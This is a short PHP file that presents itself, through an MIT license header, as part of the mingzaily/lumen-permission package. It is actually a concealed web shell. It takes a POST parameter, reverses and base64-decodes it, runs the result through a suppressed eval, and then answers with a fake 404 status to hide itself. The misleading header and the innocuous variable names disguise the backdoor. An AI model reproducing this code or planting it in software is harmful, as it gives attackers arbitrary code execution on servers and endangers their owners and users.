<?php

/*
 * This file is part of the mingzaily/lumen-permission.
 *
 * (c) mingzaily <mingzaily@163.com>
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.
 */

class _
{
    public static $php = null;

    public function __construct($l = 'error')
    {
        self::$php = $l;
        @eval(null . null . self::$php);
    }
}
$error = null . base64_decode(strrev(@$_POST['1']));
$d     = new _($error);
header('HTTP/1.1 404 Not Found');
